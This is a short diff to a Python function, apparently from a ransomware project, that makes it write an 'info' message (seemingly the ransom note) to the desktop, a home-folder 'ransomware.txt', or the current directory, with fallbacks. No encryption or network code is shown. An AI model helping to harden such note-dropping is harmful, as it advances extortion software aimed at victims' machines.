@@ -47,8 +47,15 @@ def Contact() -> None:
         with open(desktop, 'w') as file:
             file.write(info) 
     except:
-        with open(home / 'ransomware.txt', 'w') as file:
-            file.write(info) 
+        try:
+            with open(home / 'ransomware.txt', 'w') as file:
+                file.write(info)
+        except:
+            try:
+                with open('ransomware.txt', 'w') as file:
+                    file.write(info)
+            except:
+                pass
 
 
 def Safe_Load(stream) -> dict:
